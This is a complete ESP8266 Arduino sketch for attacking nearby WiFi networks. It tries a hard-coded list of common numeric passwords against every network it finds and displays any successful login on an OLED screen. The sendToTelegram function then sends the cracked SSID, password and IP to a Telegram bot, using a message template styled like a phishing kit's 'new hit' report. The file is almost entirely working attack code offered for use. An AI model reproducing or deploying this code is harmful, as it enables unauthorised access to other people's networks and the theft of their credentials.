#include <ESP8266WiFi.h>
#include <ESP8266HTTPClient.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// === Function Prototypes ===
void showAndSerial(const char* msg, const char* val = "");
void showTry(const char* pass);
void sendToTelegram(String ssid, const char* pass, String ip);
String urlencode(String str);

// === Telegram Info ===
const char* botToken = "BOT TOKEN";
const char* chatID = "USER ID";

// === Password List ===
const char* passwords[] = {
  "12345678", "123456789", "1234567890", "0987654321", "987654321",
  "87654321", "11111111", "22222222", "66666666", "00000000",
  "11223344", "12233344", "12344321", "88997766", "14725836",
  "10293847", "19283746", "76543210", "55555555", "33333333",
  "44444444", "88888888", "10101010", "20202020", "30303030",
  "90909090", "70707070", "69696969", "78787878", "56565656",
  "23232323", "14141414", "12121212", "19191919", "17171717",
  "876543210", "88887777", "99998888", "44443333", "11110000",
  "13579135", "24682468", "19876543", "11221122", "99889988",
  "88776655", "22334455", "33445566", "44556677", "55667788"
};

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  display.clearDisplay();
  display.setTextColor(WHITE);
  display.setTextSize(1);
  display.setCursor(0, 0);
  display.println("📡 Scanning...");
  display.display();

  int n = WiFi.scanNetworks();
  if (n == 0) {
    showAndSerial("No WiFi found.");
    return;
  }

  for (int i = 0; i < n; i++) {
    String ssid = WiFi.SSID(i);
    showAndSerial("SSID:", ssid.c_str());

    for (int j = 0; j < sizeof(passwords)/sizeof(passwords[0]); j++) {
      const char* pass = passwords[j];
      WiFi.begin(ssid.c_str(), pass);
      showTry(pass);

      int wait_time = 0;
      while (WiFi.status() != WL_CONNECTED && wait_time < 10) {
        delay(500);
        Serial.print(".");
        wait_time++;
      }

      if (WiFi.status() == WL_CONNECTED) {
        IPAddress ip = WiFi.localIP();
        String ipStr = ip.toString();

        display.clearDisplay();
        display.setCursor(0, 0);
        display.println("✅ Connected!");
        display.print("SSID: "); display.println(ssid);
        display.print("IP: "); display.println(ipStr);
        display.print("PASS: "); display.println(pass);
        display.display();

        Serial.println("\n✅ CONNECTED!");
        Serial.println("SSID: " + ssid);
        Serial.println("IP: " + ipStr);
        Serial.println("PASS: " + String(pass));

        sendToTelegram(ssid, pass, ipStr);
        return;
      }

      WiFi.disconnect(); // Try next password
    }
  }

  showAndSerial("❌ No WiFi login");
}

void loop() {}

void showAndSerial(const char* msg, const char* val) {
  Serial.println(String(msg) + " " + String(val));
  display.clearDisplay();
  display.setCursor(0, 0);
  display.print(msg);
  if (val[0]) {
    display.print(" ");
    display.println(val);
  }
  display.display();
}

void showTry(const char* pass) {
  Serial.println("🔑 Trying pass: " + String(pass));
  display.setCursor(0, 20);
  display.print("Try: "); display.println(pass);
  display.display();
}

void sendToTelegram(String ssid, const char* pass, String ip) {
  if (WiFi.status() != WL_CONNECTED) return;

  String date = __DATE__;
  String time = __TIME__;
  String text = "𓆩𓆩  𝙷𝙸 𝚈𝙾𝚄 𝙷𝙰𝚅𝙴 𝙽𝙴𝚆 𝙷𝙸𝚃  ツ.𓆪𓆪\n\n";
  text += "🐉 ⊚-----------------------------------⊚ 🐉\n";
  text += "💬 MAIN INFO :\n";
  text += "📧 ↝ 𝙴𝚖𝚊𝚒𝚕 »  01328276240\n";
  text += "📟 ↝ 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 »  " + String(pass) + "\n";
  text += "🏴 ↝ 𝙲𝚘𝚞𝚗𝚝𝚛𝚢 »  BANGLADESH\n";
  text += "⏳ ↝ 𝙲𝚘𝚍𝚎 »  +880\n";
  text += "📅 Date: " + date + "\n";
  text += "⏱ Time: " + time + "\n";
  text += "🌐 IP: " + ip + "\n";
  text += "🐉 ⊚-----------------------------------⊚ 🐉\n";
  text += "👨‍💻 Developer :  MD.NAHIDUL ISLAM";

  String url = "https://api.telegram.org/bot" + String(botToken) + "/sendMessage?chat_id=" + String(chatID) + "&text=" + urlencode(text);

  WiFiClient client;
  HTTPClient http;
  http.begin(client, url);
  int httpCode = http.GET();
  Serial.printf("Telegram send HTTP code: %d\n", httpCode);
  http.end();
}

String urlencode(String str) {
  String encoded = "";
  char c;
  for (int i = 0; i < str.length(); i++) {
    c = str.charAt(i);
    if (isalnum(c) || c == ' ' || c == '\n' || c == '_' || c == '-' || c == '.') {
      if (c == ' ') encoded += "+";
      else encoded += c;
    } else {
      char buf[5];
      sprintf(buf, "%%%02X", c);
      encoded += buf;
    }
  }
  return encoded;
}
